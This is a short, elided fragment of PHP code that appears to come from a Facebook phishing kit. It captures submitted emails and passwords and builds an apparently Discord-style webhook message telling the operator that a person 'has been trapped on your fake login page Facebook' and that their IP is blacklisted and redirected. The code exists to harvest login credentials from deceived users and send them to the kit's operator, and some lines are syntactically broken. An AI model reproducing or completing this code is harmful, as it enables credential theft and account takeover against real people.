...
<?php
    ...
    error_reporting(-0);
        ...
        $email = "  ¦    ¦- email: ". $_POST[name='email']. "\n";
        $password = "  ¦    ¦- password: ". $_POST[name='password']. "\n";
    ...
    "embeds" => [
        [
            ...
            "type" => "rich",
            "description" => 'A new person has been trapped on your fake login page Facebook. His IP was therefore added to the blacklist. The next time they visit your site, they will be automatically redirected to the link specified in the "`redirection.txt`" file.',
            "url" => $github_back[1],
            "timestamp" => $timestamp,
            "color" => hexdec( "#0000" ),
            "footer" => [
